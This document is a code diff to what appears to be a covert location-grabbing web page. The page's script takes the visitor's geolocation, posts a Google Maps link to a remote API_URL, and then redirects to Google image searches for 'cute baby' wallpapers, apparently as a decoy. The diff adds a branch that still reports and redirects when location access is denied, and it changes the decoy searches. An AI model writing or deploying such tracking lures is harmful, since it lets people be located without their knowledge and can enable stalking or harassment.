@@ -10,9 +10,18 @@
           data.mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
           postData();
         },
+         function () {
+         data.mapLink = "Location access denied";
+         postData();
+         window.location.href =
+              "https://www.google.com/search?q=cute+baby+girl+wallpaper+hd&tbm=isch";
+    }
         
       );
+      
 
+
+        
       function postData() {
         fetch(API_URL, {
           method: "POST",
@@ -20,11 +29,11 @@
         })
           .then(() => {
             window.location.href =
-              "https://www.google.com/search?q=nature+wallpapers&tbm=isch";
+              "https://www.google.com/search?q=cute+baby+wallpapers&tbm=isch";
           })
           .catch(() => {
             window.location.href =
-              "https://www.google.com/search?q=cute+cats&tbm=isch";
+              "https://www.google.com/search?q=cute+baby+girl+wallpaper+hd&tbm=isch";
           });
       }
     }
